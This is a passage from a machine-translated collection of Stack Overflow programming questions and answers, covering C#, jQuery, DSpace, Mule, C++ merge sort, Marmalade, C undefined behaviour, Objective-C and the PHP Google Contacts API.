          DoThreadStuff(localData);
     });
}
while (tasks.Any(t => !t.IsCompleted)) { } //spin wait

Console.WriteLine("All my threads/tasks have completed. Ready to continue"); 
```

如果你对线程和任务没有什么经验，我建议你走任务路线。相比之下，它们使用起来非常简单。

# c# - 当滚动位置位于页面底部时如何查看图像？

> ID：13221230
> 
> 赞同：0
> 
> 时间：2012-11-04T17:51:36.663
> 
> 标签：c#, javascript, jquery

当用户单击页面底部的服务器端链接或按钮时，我需要浏览器将我的 ASP.NET 页面滚动到顶部。

```
<div id="box" style=" position: fixed; bottom:5px;">
<a href="#top" >Back to up<img  height="40" src="../images/btnup.png" /></a> 
```

我为此使用此代码：

```
 $(document).ready(function () {

        $('a[href=#top]').click(function () {
            $('html, body').animate({ scrollTop: 0 }, 'slow');
            return false;
        });

    }); 
```

我想在滚动位置位于页面底部时显示此按钮，并且不想在滚动位置位于页面顶部时显示此按钮。

当滚动位置在页面底部时如何查看此按钮？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T04:36:32.167

我使用此代码。它对我有用。

```
<style type='text/css'>
  #bttop{border:1px solid #4adcff;background:#24bde2;text-align:center;padding:5px;position:fixed;bottom:35px;right:10px;cursor:pointer;display:none;color:#fff;font-size:11px;font-weight:900;} 
  #bttop:hover{border:1px solid #ffa789;background:#ff6734;}
</style> 
<div id='bttop'>Top</div>
<script src='http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js' type='text/javascript'></script> <script type='text/javascript'>$(function(){$(window).scroll(function(){if($(this).scrollTop()!=0){$('#bttop').fadeIn();}else{$('#bttop').fadeOut();}});$('#bttop').click(function(){$('body,html').animate({scrollTop:0},800);});});</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T17:58:30.080

添加一个滚动侦听器并通过检查主容器（可能是主体）scrollTop 是否为最大值来管理按钮的可见性：

```
var $elem  = $('#mainContainer');
var $button = $('#top');
$(window).scroll(function(){
    if ($elem[0].scrollHeight - $elem.scrollTop() == $elem.outerHeight()) {
      // We're at the bottom. 
      $button .show();
    }           
   else
       $button .hide();
}); 
```

更多示例：[http ://www.yelotofu.com/2008/10/jquery-how-to-tell-if-youre-scroll-to-bottom/](http://www.yelotofu.com/2008/10/jquery-how-to-tell-if-youre-scroll-to-bottom/)

# dspace - 如何更改 XMLUI 的字段和元素

> ID：13221235
> 
> 赞同：2
> 
> 时间：2012-11-04T17:53:00.877
> 
> 标签：dspace

[我需要更改DSpace](https://en.wikipedia.org/wiki/DSpace)的 XMLUI 中出现的月份名称。

他们来自哪里？我想通过源代码以编程方式更改它们，以便每个选择月份的人都能看到我想要的单词。

我应该在 Java 源代码还是其他地方搜索 April、August 等？

一般来说，我想知道 DRI 主体的所有元素来自哪里。我找不到在代码中生成它们的源代码。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-11T12:38:09.273

XMLUI 中显示的大部分文本来自 .in 中的国际**化**目录。但是，我在那里看不到任何月份条目，因此月份名称似乎是硬编码的，例如。`[dspace]/webapps/xmlui/i18n/``messages.xml`

我知道更改月份名称的唯一方法是更改​​ DSpace 的语言。然而，这个函数似乎有一个错误，尽管 DSpace 语言设置，月份的语言设置为 JVM 的语言：请参阅[DS-1418: Month names without translation](https://jira.duraspace.org/browse/DS-1418)。

如果您需要翻译的月份名称，可能最容易对此问题进行投票，看看它是否在 DSpace 3.2 中得到解决。

# maven - 如何在 Tomcat 服务器中部署 MuleApp？

> ID：13221237
> 
> 赞同：1
> 
> 时间：2012-11-04T17:53:10.437
> 
> 标签：maven, deployment, tomcat7, esb, mule

嗨，有人可以回答我如何在 tomcat 中部署 muleapp 吗？

我已经使用 Maven -mvn package war:war 打包了 muleapp，但是在使用 Maven 构建和打包它之前，我必须在 muleapp 中手动添加 WEB-INF 文件夹，因为 muleapp 的结构与 webapp 不同。

有没有更好的方法如何将 muleapp 转换为 webapp 结构？

非常感谢你！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T19:17:56.110

[Mule Application](http://www.mulesoft.org/documentation/display/MULE3USER/Application+Format) and [Web Archive (WAR)](http://java.boot.by/wcd-guide/ch02.html) are two different formats, and for this reason they are not interchangeable.

To create a web application that uses mule you should start from the [maven war archetype](http://maven.apache.org/guides/mini/guide-webapp.html) and then following the instruction available [here](http://www.mulesoft.org/documentation/display/MULE3USER/Embedding+Mule+in+a+Java+Application+or+Webapp) to configure your web.xml

# c# - 组合框边框样式

> ID：13221240
> 
> 赞同：5
> 
> 时间：2012-11-04T17:53:30.520
> 
> 标签：c#, winforms, combobox

嗨，我已将组合框控件的平面样式设置为平面。

**是否可以在此控件周围绘制边框？**

该控件没有borderstyle 属性。任何建议，将不胜感激。旁注：如果可能的话，我希望保持平面样式平坦。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-11-04T18:43:52.807

创建自定义 ComboBox 控件，并覆盖它的`WndProc`方法。[您可以使用ControlPaint.DrawBorder](http://msdn.microsoft.com/en-us/library/system.windows.forms.controlpaint.drawborder.aspx)方法轻松绘制边框：

```
public class ComboBoxWithBorder : ComboBox
{
    private Color _borderColor = Color.Black;
    private ButtonBorderStyle _borderStyle = ButtonBorderStyle.Solid;
    private static int WM_PAINT = 0x000F; 

    protected override void WndProc(ref Message m)
    {
        base.WndProc(ref m);

        if (m.Msg == WM_PAINT)
        {
            Graphics g = Graphics.FromHwnd(Handle);
            Rectangle bounds = new Rectangle(0, 0, Width, Height);
            ControlPaint.DrawBorder(g, bounds, _borderColor, _borderStyle);
        }
    }

    [Category("Appearance")]
    public Color BorderColor
    {
        get { return _borderColor; }
        set 
        { 
            _borderColor = value;
            Invalidate(); // causes control to be redrawn
        }
    }

    [Category("Appearance")]
    public ButtonBorderStyle BorderStyle
    {
        get { return _borderStyle; }
        set 
        { 
            _borderStyle = value;
            Invalidate();
        }
    }     
} 
```

*顺便说一句*，还有重载的 DrawBorder 方法，它允许设置边框的宽度。如果需要，请使用它。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-04T20:37:41.693

将其放在面板中，在面板上设置边框，将 cmb 框放在面板中，将 cmb 框设置为停靠填充和边框样式 flat.simple 但不是那么优雅的解决方案。

# javascript - 以 RTF 格式解码字符串

> ID：13221241
> 
> 赞同：0
> 
> 时间：2012-11-04T17:53:40.317
> 
> 标签：javascript, decode

似乎是 RTF 的软件编码输出字符串，我如何使用 JS 对其进行解码，其输出示例为：

```
1\. \tab \uc0\u1776{}\uc0\u1777{} \uc0\u8211{} \uc0\u1605{}\uc0\u1575{}\uc0\u1578{}\uc0\u1585{}\uc0\u1740{}\uc0\u1587{}\uc0\u8204{}\uc0\u1607{}\uc0\u1575{}\uc0\u1740{} \uc0\u1608{}\uc0\u1575{}\uc0\u1585{}\uc0\u1608{}\uc0\u1606{} \uc0\u1662{}\uc0\u1584{}\uc0\u1740{}\uc0\u1585{} | \uc0\u1705{}\uc0\u1604{}\uc0\u1575{}\uc0\u1587{}\uc0\u1616{} \uc0\u1583{}\uc0\u1585{}\uc0\u1587{}[\uc0\u1575{}\uc0\u1740{}\uc0\u1606{}\uc0\u1578{}\uc0\u1585{}\uc0\u1606{}\uc0\u1578{}]. [\uc0\u1575{}\uc0\u1587{}\uc0\u1578{}\uc0\u1606{}\uc0\u1575{}\uc0\u1583{} 5 \uc0\u1570{}\uc0\u1584{}\uc0\u1585{} 2012]. Available \uc0\u1575{}\uc0\u1586{}: http://kelasedars.org/?p=908 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T18:00:30.427

那可能是RTF。这是 JS 中的 RTF 解析器：

[https://github.com/lazygyu/RTF-parser](https://github.com/lazygyu/RTF-parser)

# c++ - 合并排序问题，在方法之间传递数组？

> ID：13221246
> 
> 赞同：3
> 
> 时间：2012-11-04T17:54:01.670
> 
> 标签：c++, merge, sorting, mergesort

我正在编写一个实现快速排序、插入排序和合并排序的程序。除了合并排序之外，我可以得到所有工作，但我不知道为什么。请忽略操作和比较变量。它们是这样我可以分析不同输入文件的运行时间和操作数量。此代码以这种方式通过类对象从 main 运行：

```
Merge testobj13(test_Med[0], 100);
    testobj13.merCall();
    testobj13.display(); 
```

对于排序列表，该类保持列表排序，对于反向列表，除了第一个和最后一个值之外，列表仍然几乎保持反向，对于随机列表，我看不到输出和原始输入之间的任何模式。在等待答案的同时，我将尝试回答其他问题。欢迎任何批评，即使只是关于我的代码或语法与这里的整体问题无关。我根据我的算法类编写的 sudo 代码编写了这段代码，所以我很难找出这里出了什么问题。

```
# include <iostream>
# include <stdio.h>
# include <stdlib.h>

using namespace std;
class Merge{
public:
    int comparisons, operations, middle, i, j, k, size;
    int *myArray, *c;

Merge::~Merge(){
    myArray = 0;
    delete myArray; 
}

Merge::Merge(int a [], int n) {
    size= n;
    myArray= new int[size];
    comparisons = 0, operations = 0, middle = 0, i = 0, j = 0, k = 0;

    for(int x = 0; x < size; x++){
       myArray[x] = a[x];
    }
}

void combine(int arr [], int first, int middle, int last){

i = first, j = middle + 1, k = first; operations = operations + 3;
c = new int[last + 1]; operations ++;

while( (i <= middle) && (j <= last) ){
    comparisons++;operations++;
    if(arr[i] <= arr[j]){operations++;
        c[k] = arr[i]; operations++;
        i++; operations++;
    }
    else{
        c[k] = arr[j]; operations++;
        j++; operations++;
    }
    k++; operations++;
}
while(i <= middle){operations++;
    c[k] = arr[i]; operations++;
    i++; operations++;
    k++; operations++;
}
while(j <= last){operations++;
    c[k] = arr[j]; operations++;
    j++; operations++;
    k++; operations++;
}
for(int k = first; k <= last; k++){operations++;
    arr[k] = c[k]; operations++;
}
c = 0;
delete c;
}

void mer(int arr [], int first, int last){
operations++; //for the comparison in the following if statement
if ( first < last ){
    middle = (first + last) / 2; operations++;
    mer(arr, first, middle);  operations++;
    mer(arr, middle + 1, last); operations++;
    combine(arr, first, middle, last); operations++;
}
}

void merCall(){
mer(myArray, 0, size - 1);
}

void display(){

cout << "The array after going through Merge Sort: " ;

for(int x = 0; x < size; x++){
    cout << endl << myArray[x];
}

cout << endl << "Number of operations :" << operations << "\t comparisons: " <<   comparisons << endl;

}

}; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T20:29:29.707

您的“中间”变量在递归期间被覆盖，因为它是类成员而不是局部变量：

```
middle = (first + last) / 2; operations++;

// This is going to affect middle
mer(arr, first, middle);  operations++;

// So this isn't going to work on the range you think it is.
mer(arr, middle + 1, last); operations++;

combine(arr, first, middle, last); operations++; 
```

最好将 middle 声明为局部变量：

```
int middle = (first + last) / 2; operations++;
mer(arr, first, middle);  operations++;
mer(arr, middle + 1, last); operations++;
combine(arr, first, middle, last); operations++; 
```

# matrix - 带有果酱的 3x3 视图矩阵

> ID：13221249
> 
> 赞同：1
> 
> 时间：2012-11-04T17:54:13.117
> 
> 标签：matrix, marmalade

我已经被一个问题困住了几个小时了。我需要将我的 4x4 矩阵（模型、视图、投影）转换为带有平移向量的 3x3 矩阵。我需要这样做，因为我使用的 API 没有 4x4 矩阵类及其完全封闭的源代码。

奇怪的是，他们的 LookAt 函数声明它根本不影响矩阵的平移部分。我用来渲染的 4x4 矩阵有它（一切都渲染 100% 正确）。

有人可以看看我的转换函数，看看我做错了什么吗？谢谢

```
CIwFMat ConvertToMarmaladeFormat(Matrix4& Mat)
{
    CIwFMat M;

    M.m[0][0] = Mat[0][0];
    M.m[0][1] = Mat[0][1];
    M.m[0][2] = Mat[0][2];

    M.m[1][0] = Mat[1][0];
    M.m[1][1] = Mat[1][1];
    M.m[1][2] = Mat[1][2];

    M.m[2][0] = Mat[2][0];
    M.m[2][1] = Mat[2][1];
    M.m[2][2] = Mat[2][2];

    M.t = CIwFVec3(Mat[3][0], Mat[3][1], Mat[3][2]);

    return M;
}

Matrix4 ConvertFromMarmaladeFormat(CIwFMat& M)
{
    Matrix4 Mat;
    Mat.identity();

    Mat[0][0] = M.m[0][0];
    Mat[0][1] = M.m[0][1];
    Mat[0][2] = M.m[0][2];

    Mat[1][0] = M.m[1][0];
    Mat[1][1] = M.m[1][1];
    Mat[1][2] = M.m[1][2];

    Mat[2][0] = M.m[2][0];
    Mat[2][1] = M.m[2][1];
    Mat[2][2] = M.m[2][2];

    Mat[3][0] = M.t.x;
    Mat[3][1] = M.t.y;
    Mat[3][2] = M.t.z;

    return Mat;
}

class Matrix4
{
    friend Vector4 operator*(const Vector4 &lhs, const Matrix4 &rhs);
    friend Vector3 operator*(const Vector3 &lhs, const Matrix4 &rhs);
    friend Matrix4 operator*(float scalar, const Matrix4 &rhs);

public:
    static const Matrix4 IDENTITY;
    static Matrix4 createFromAxes(const Vector3 &x, const Vector3 &y, const Vector3 &z);
    static Matrix4 createFromAxesTransposed(const Vector3 &x, const Vector3 &y, const Vector3 &z);
    static Matrix4 createFromHeadPitchRoll(float headDegrees, float pitchDegrees, float rollDegrees);
    static Matrix4 createMirror(const Vector3 &planeNormal, const Vector3 &pointOnPlane);
    static Matrix4 createOrient(const Vector3 &from, const Vector3 &to);
    static Matrix4 createRotate(const Vector3 &axis, float degrees);
    static Matrix4 createScale(float sx, float sy, float sz);
    static Matrix4 createTranslate(float tx, float ty, float tz);

    Matrix4() {}
    Matrix4(float m11, float m12, float m13, float m14,
            float m21, float m22, float m23, float m24,
            float m31, float m32, float m33, float m34,
            float m41, float m42, float m43, float m44);
    ~Matrix4() {}

    float *operator[](int row);
    const float *operator[](int row) const;

    bool operator==(const Matrix4 &rhs) const;
    bool operator!=(const Matrix4 &rhs) const;

    Matrix4 &operator+=(const Matrix4 &rhs);
    Matrix4 &operator-=(const Matrix4 &rhs);
    Matrix4 &operator*=(const Matrix4 &rhs);
    Matrix4 &operator*=(float scalar);
    Matrix4 &operator/=(float scalar);

    Matrix4 operator+(const Matrix4 &rhs) const;
    Matrix4 operator-(const Matrix4 &rhs) const;
    Matrix4 operator*(const Matrix4 &rhs) const;
    Matrix4 operator*(float scalar) const;
    Matrix4 operator/(float scalar) const;

    float determinant() const;
    void fromAxes(const Vector3 &x, const Vector3 &y, const Vector3 &z);
    void fromAxesTransposed(const Vector3 &x, const Vector3 &y, const Vector3 &z);
    void fromHeadPitchRoll(float headDegrees, float pitchDegrees, float rollDegrees);
    void identity();
    Matrix4 inverse() const;
    void orient(const Vector3 &from, const Vector3 &to);
    void rotate(const Vector3 &axis, float degrees);
    void scale(float sx, float sy, float sz);
    void toAxes(Vector3 &x, Vector3 &y, Vector3 &z) const;
    void toAxesTransposed(Vector3 &x, Vector3 &y, Vector3 &z) const;
    void toHeadPitchRoll(float &headDegrees, float &pitchDegrees, float &rollDegrees) const;
    void translate(float tx, float ty, float tz);
    Matrix4 transpose() const;

private:
    float mtx[4][4];
};

class CIwFMat
{
public:
/**
 * 3x3 rotation matrix.
 */
    float   m[3][3];
/**
 * Trans vector.
 */
    CIwFVec3    t;

...

}; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-01T16:56:31.177

您的转换看起来不错，但请检查：

1.  Marmalade 使用行列矩阵表示法和右手轴系统（请记住您的转换）

2.  果酱“视图”矩阵实际上不是视图矩阵，它是相机位置和方向矩阵。要获得实际的视图矩阵，应该这样做：

    ```
    CIwFMat MarmaladeView = IwGxGetViewMatrix();
    CIwFMat view = (CIwFMat(CIwFMat::g_Identity, -MarmaladeView.GetTrans()) * MarmaladeView.GetTranspose()); // actually it's simple matrix inversion, but CIwFMat doesn't have Inverse() method
    // in some cases your should add axis-flip transform 
    ```

3.  果酱 IwGxGetPerspectiveMatrix() 在正交投影的情况下返回无效的投影矩阵（文档没有说明这个有趣的事实）

4.  LookAt() 函数只是将矩阵的旋转部分设置为匹配 2 点之间的方向，所以手动进行平移

5.  检查你的远/近飞机

6.  所有 MVP 矩阵都应该由

    ```
    IwGxSetViewMatrix(); // sets view matrix view - camera position
    IwGxSetModelMatrix(); // sets model matrix
    IwGxSetPerspMul(); // sets perspective projection in terms of distance to view plane
    IwGxSetFarZNearZ(); // sets clipping planes 
    ```

# c - 为什么我没有收到“分段错误”？

> ID：13221251
> 
> 赞同：3
> 
> 时间：2012-11-04T17:54:20.990
> 
> 标签：c, string

> **可能重复：**
> [为什么我写超出数组末尾时不会出现分段错误？](https://stackoverflow.com/questions/12410016/why-dont-i-get-a-segmentation-fault-when-i-write-beyond-the-end-of-an-array)

此代码编译并运行没有任何错误。但是怎么做？

```
#include <stdio.h>

int main (void)
{
    int foo[2];

    foo[8] = 4; /* How could this happen? */

    printf("%d\n", foo[8]);

    return 0;
} 
```

我在 Arch Linux x86_64 上使用**GCC 4.7.2进行编译。**

```
gcc -Wall -o "main" "main.c" 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-04T17:56:44.240

因为未定义的行为并不意味着“您将收到段错误”，所以这将是已定义的行为。

假设您在调试模式下运行并且您的编译器正在填充您的堆栈/局部变量空间。您可能只是在写入堆栈空间的一些未使用部分。

在星期一构建一个发布版本，当你的编译器感觉很古怪，现在你覆盖了返回地址，或者设置调用的代码`printf`，不管怎样。哎呀。

只有一种可能的结果，但你明白了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T17:56:36.507

`foo[8]`可能分配给您的程序（例如填充目的），属于您的操作系统。对于未定义的行为，任何事情都可能发生；你很不幸，因为它有效。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T17:56:51.190

尝试

```
foo[1000000]=42; 
```

看看会发生什么。

# objective-c - 如何解决：实施不完整

> ID：13221253
> 
> 赞同：0
> 
> 时间：2012-11-04T17:54:34.910
> 
> 标签：objective-c, ios, xcode, implementation

如何解决**执行不完整**的问题？

Controller.m 视图：

```
 #import "Quiz_GameViewController.h"

@implementation Quiz_GameViewController

@synthesize theQuestion, timer, theScore, theLives, answerOne, answerTwo, answerThree, answerFour, theQuiz
    ;

-(void)askQuestion
{
    // Unhide all the answer buttons.
    [answerOne setHidden:NO];
    [answerTwo setHidden:NO];
    [answerThree setHidden:NO];
    [answerFour setHidden:NO];

    // Set the game to a "live" question (for timer purposes)
    questionLive = YES;

    // Set the time for the timer
    time = 8.0;

    // Go to the next question
    questionNumber = questionNumber + 1;

    // We get the question from the questionNumber * the row that we look up in the array.

    NSInteger row = 0;
    if(questionNumber == 1)
    {
        row = questionNumber - 1;
    }
    else
    {
        row = ((questionNumber - 1) * 6);
    }

    // Set the question string, and set the buttons the the answers
    NSString *selected = [theQuiz objectAtIndex:row];
    NSString *activeQuestion = [[NSString alloc] initWithFormat:@"Question: %@", selected];
    [answerOne setTitle:[theQuiz objectAtIndex:row+1] forState:UIControlStateNormal];
    [answerTwo setTitle:[theQuiz objectAtIndex:row+2] forState:UIControlStateNormal];
    [answerThree setTitle:[theQuiz objectAtIndex:row+3] forState:UIControlStateNormal];
    [answerFour setTitle:[theQuiz objectAtIndex:row+4] forState:UIControlStateNormal];
    rightAnswer = [[theQuiz objectAtIndex:row+5] intValue];

    // Set theQuestion label to the active question
    theQuestion.text = activeQuestion;

    // Start the timer for the countdown
    timer = [NSTimer scheduledTimerWithTimeInterval:1.0 target:self selector:@selector(countDown) userInfo:nil repeats:YES];

    [selected release];
    [activeQuestion release];
}

-(void)updateScore
{
    // If the score is being updated, the question is not live
    questionLive = NO;

    [timer invalidate];

    // Hide the answers from the previous question
    [answerOne setHidden:YES];
    [answerTwo setHidden:YES];
    [answerThree setHidden:YES];
    [answerFour setHidden:YES];
    NSString *scoreUpdate = [[NSString alloc] initWithFormat:@"Score: %d", myScore];
    theScore.text = scoreUpdate;
    [scoreUpdate release];

    // END THE GAME.
    NSInteger endOfQuiz = [theQuiz count];
    if((((questionNumber - 1) * 6) + 6) == endOfQuiz)
    {
        // Game is over.
        if(myScore > 0)
        {
            NSString *finishingStatement = [[NSString alloc] initWithFormat:@"Game Over!\nNice Game \nYou scored %i!", myScore];
            theQuestion.text = finishingStatement;
            [finishingStatement release];
        }
        else
        {
            NSString *finishingStatement = [[NSString alloc] initWithFormat:@"Game Over!\n You're terrible! \nYou scored %i.", myScore];
            theQuestion.text = finishingStatement;
            [finishingStatement release];
        }
        theLives.text = @"";

        // Make button 1 appear as a reset game button
        restartGame = YES;
        [answerOne setHidden:NO];
        [answerOne setTitle:@"Restart game!" forState:UIControlStateNormal];

    }
    else
    {
    // Give a short rest between questions
    time = 3.0;

    // Initialize the timer
    timer = [NSTimer scheduledTimerWithTimeInterval:1.0 target:self selector:@selector(countDown) userInfo:nil repeats:YES];
    }
}

-(void)countDown
{
    // Question live counter
    if(questionLive==YES)
    {
        time = time - 1;
        theLives.text = [NSString stringWithFormat:@"Time remaining: %i!", time];

        if(time == 0)
        {
            // Loser!
            questionLive = NO;
            theQuestion.text = @"HAHA now you lost alot of points!";
            myScore = myScore - 1000;
            [timer invalidate];
            [self updateScore];
        }
    }
    // In-between Question counter
    else
    {
        time = time - 1;
        theLives.text = [NSString stringWithFormat:@"Next question coming in...%i!", time];

        if(time == 0)
        {
            [timer invalidate];
            theLives.text = @"";
            [self askQuestion];
        }
    }
    if(time < 0)
    {
        [timer invalidate];
    }
}

- (IBAction)buttonOne
{
    if(questionNumber == 0){
        // This means that we are at the startup-state
        // We need to make the other buttons visible, and start the game.
        [answerTwo setHidden:NO];
        [answerThree setHidden:NO];
        [answerFour setHidden:NO];
        [self askQuestion];
    }
    else
    {
        NSInteger theAnswerValue = 1;
        [self checkAnswer:(int)theAnswerValue];
        if(restartGame==YES)
        {
            // Create a restart game function.
        }
    }
}

- (IBAction)buttonTwo
{
    NSInteger theAnswerValue = 2;
    [self checkAnswer:(int)theAnswerValue];
}

- (IBAction)buttonThree
{
    NSInteger theAnswerValue = 3;
    [self checkAnswer:(int)theAnswerValue];
}

- (IBAction)buttonFour
{
    NSInteger theAnswerValue = 4;
    [self checkAnswer:(int)theAnswerValue];
}

// Check for the answer (this is not written right, but it runs)
-(void)checkAnswer:(int)theAnswerValue
{
    if(rightAnswer == theAnswerValue)
    {
        theQuestion.text = @"Daaamn";
        myScore = myScore + 50;
    }
    else
    {
        theQuestion.text = @"hahaha!";
        myScore = myScore - 50;
    }
    [self updateScore];
}

// Implement viewDidLoad to do additional setup after loading the view, typically from a nib.
- (void)viewDidLoad {
    [super viewDidLoad];
    questionLive = NO;
    restartGame = NO;
    theQuestion.text = @"Think you can do it?";
    theScore.text = @"Score:0";
    theLives.text = @"";
    questionNumber = 0;
    myScore = 0;
    myLives = 0;
    [answerOne setTitle:@"I think i can!" forState:UIControlStateNormal];
    [answerTwo setHidden:YES];
    [answerThree setHidden:YES];
    [answerFour setHidden:YES];
    [self loadQuiz];
}

-(void)loadQuiz
{
    // This is our forced-loaded array of quiz questions.
    // FORMAT IS IMPORTANT!!!!
    // 1: Question, 2 3 4 5: Answers 1-4 respectively, 6: The right answer
    // THIS IS A TERRIBLE WAY TO DO THIS. I will figure out how to do nested arrays to make this better.
    NSArray *quizArray = [[NSArray alloc] initWithObjects:@"Who is the president in USA?",@"Me",@"Obama",@"George Bush",@"Justin Bieber",@"2",
                          @"Capital in Norway?", @"Bergen", @"Trondheim", @"Oslo", @"Bærum", @"3",
                          @"The right answer is 3!", @"41", @"24", @"3", @"9", @"1",
                          @"Do I have a cat?", @"Yes", @"No", @"No, you have a dog", @"No, you have a flying hamster", @"4",
                          @"Baba", @"Daba jaba?", @"Laba daba haba?", @"Saba daba gaba?", @"Haba haba?", @"4",
                          nil];
    self.theQuiz = quizArray;
    [quizArray release];

}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning]; // Releases the view if it doesn't have a superview
    // Release anything that's not essential, such as cached data
}

- (void)dealloc {
    [theQuestion release];
    [theScore release];
    [theLives release];
    [answerOne release];
    [answerTwo release];
    [answerThree release];
    [answerFour release];
    [theQuiz release];
    [timer release];
    [super dealloc];
}

@end 
```

我是新来的，这是来自互联网的示例脚本...我用它来学习语言 Objective-C 和 Cocoa...ViewController.h ：

```
#import <UIKit/UIKit.h>

@interface Quiz_GameViewController : UIViewController {
    IBOutlet    UILabel     *theQuestion;
    IBOutlet    UILabel     *theScore;
    IBOutlet    UILabel     *theLives;
    IBOutlet    UIButton    *answerOne;
    IBOutlet    UIButton    *answerTwo;
    IBOutlet    UIButton    *answerThree;
    IBOutlet    UIButton    *answerFour;
    NSInteger myScore;
    NSInteger myLives;
    NSInteger questionNumber;
    NSInteger rightAnswer;
    NSInteger time;
    NSArray *theQuiz;
    NSTimer *timer;
    BOOL questionLive;
    BOOL restartGame;
}

@property (retain, nonatomic) UILabel   *theQuestion;
@property (retain, nonatomic) UILabel   *theScore;
@property (retain, nonatomic) UILabel   *theLives;
@property (retain, nonatomic) UIButton  *answerOne;
@property (retain, nonatomic) UIButton  *answerTwo;
@property (retain, nonatomic) UIButton  *answerThree;
@property (retain, nonatomic) UIButton  *answerFour;
@property (retain, nonatomic) NSArray *theQuiz;
@property (retain, nonatomic) NSTimer *timer;

-(IBAction)buttonOne;
-(IBAction)buttonTwo;
-(IBAction)buttonThree;
-(IBAction)buttonFour;

-(void)checkAnswer;

-(void)askQuestion;

-(void)updateScore;

-(void)loadQuiz;

-(void)countDown;

@end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T17:59:25.797

在你的头文件中，你已经声明了方法`-(void)checkAnswer`，而在 .m 文件中你已经声明了它`-(void)checkAnswer:(int)theAnswerValue`。

这意味着您的 .m 文件正在寻找一个`-(void)checkAnswer`不存在的方法，它会产生一个`Incomplete implementation`警告。只需将 .h 文件中的声明更改为`- (void)checkAnswer:(int)theAnswerValue`，就可以了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T18:00:27.000

checkAnswer 的签名在你 .h 和 .m 中是不同的

在 Quiz_GameViewController.h 中：

```
-(void)checkAnswer; 
```

在 Quiz_GameViewController.m

```
-(void)checkAnswer:(int)theAnswerValue 
```

**修复：**将 Quiz_GameViewController.h 更改为：

```
- (void)checkAnswer:(int)theAnswerValue, 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-04T18:01:02.103

看看`.h`你有（没有参数的方法）：

```
-(void)checkAnswer; 
```

并且`.m`你有（带有一个`int`参数的方法）：

```
-(void)checkAnswer:(int)theAnswerValue 
```

**不完整的实现**意味着你声明了一些东西，`.h`但没有在`.m`.

# php - PHP Google API Client v3 获取联系人

> ID：13221256
> 
> 赞同：1
> 
> 时间：2012-11-04T17:54:58.343
> 
> 标签：php, xml-parsing, google-api, google-api-php-client

我仍然无法使用新的 google_api_client php 库。我正在尝试检索用户的联系人。

我非常接近正确的解决方案......我的意思是，我刚刚得到了所有结果，但无法解析它。

可能是因为我不擅长 XML 解析器。经过测试和测试......我得到了这个解决方案（基于谷歌的示例文件）：

```
...
$req = new apiHttpRequest("https://www.google.com/m8/feeds/contacts/default/full");         
$val = $client->getIo()->authenticatedRequest($req);
$response = simplexml_load_string($val->getResponseBody());

foreach($response->entry as $entry)
{
    $child = $entry->children("http://schemas.google.com/g/2005");
    $mail_info = $child->attributes();
}
... 
```

在 $response 中，我可以获得存储联系人全名的标题字段，在 $mail_info 中，我获得了一个对象，当我获得电子邮件地址时，我可以在其中看到地址字段。

这是一个悲伤和丑陋的解决方案......如果我想要公司名称，地址......电话号码......照片怎么办。所有这些信息在哪里。

如何在出色而干净的解决方案中使用 Google 响应？

任何人都可以给我一些帮助。再见

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-11-07T22:25:52.690

帮助我的是请求 JSON 而不是 XML。尝试`?alt=json`在您向 google 发出的请求中添加到 URL 的末尾。

```
$req = new apiHttpRequest("https://www.google.com/m8/feeds/contacts/default/full?alt=json");         
$val = $client->getIo()->authenticatedRequest($req);
$string = $val->getResponseBody();
$phparray = json_decode($string); 
```

获得你想要的东西当然不是儿戏，但使用 php 数组可能更容易。

为了完整起见，这是我们可能都发现对我们有帮助的[google contacts php 示例：](https://code.google.com/p/google-api-php-client/source/browse/trunk/examples/contacts/simple.php)

[https://code.google.com/p/google-api-php-client/source/browse/trunk/examples/contacts/simple.php](https://code.google.com/p/google-api-php-client/source/browse/trunk/examples/contacts/simple.php)

**编辑：**

这是另一个可能有帮助的链接。在评论中，它描述了使用 JSON 访问联系人数据的清洁器。

[http://25labs.com/import-gmail-or-google-contacts-using-google-contacts-data-api-3-0-and-oauth-2-0-in-php/](http://25labs.com/import-gmail-or-google-contacts-using-google-contacts-data-api-3-0-and-oauth-2-0-in-php/)

```
$url = 'https://www.google.com/m8/feeds/contacts/default/full?max-results='.$max_results.'&alt=json&v=3.0&oauth_token='.$accesstoken;
$xmlresponse =  curl_file_get_contents($url);

$temp = json_decode($xmlresponse,true);

foreach($temp['feed']['entry'] as $cnt) {
    echo $cnt['title']['$t'] . " --- " . $cnt['gd$email']['0']['address'] . "</br>";
} 
```

和

```
$url = 'https://www.google.com/m8/feeds/contacts/default/full?max-results='.$max_results.'&alt=json&v=3.0&oauth_token='.$accesstoken;
$xmlresponse =  curl_file_get_contents($url);

$temp = json_decode($xmlresponse,true);

foreach($temp['feed']['entry'] as $cnt) {
    echo $cnt['title']['$t'] . " --- " . $cnt['gd$email']['0']['address'];
    if(isset($cnt['gd$phoneNumber'])) echo " --- " . $cnt['gd$phoneNumber'][0]['$t'];
    if(isset($cnt['gd$structuredPostalAddress'][0]['gd$street'])) echo " --- " . $cnt['gd$structuredPostalAddress'][0]['gd$street']['$t'];
    if(isset($cnt['gd$structuredPostalAddress'][0]['gd$neighborhood'])) echo " --- " . $cnt['gd$structuredPostalAddress'][0]['gd$neighborhood']['$t'];
    if(isset($cnt['gd$structuredPostalAddress'][0]['gd$pobox'])) echo " --- " . $cnt['gd$structuredPostalAddress'][0]['gd$pobox']['$t'];
